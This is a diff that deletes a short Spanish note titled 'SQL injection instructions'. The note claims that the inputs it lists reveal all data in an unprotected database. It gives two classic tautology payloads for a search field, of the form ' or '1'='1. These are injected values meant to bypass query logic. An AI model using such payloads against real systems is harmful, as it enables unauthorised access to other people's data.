@@ -1,8 +1,0 @@
-INSTRUCCIONES DE INYECCIONES SQL
-
-
-con estas instrucciones puedes ver todos los datos de una db si es que no esta protegida
-
-	BUSCADOR = PALABRAMAGICA' or 'z'='z'
-
-	BUSCADOR = PALABRAMAGICA' or '1'='1'
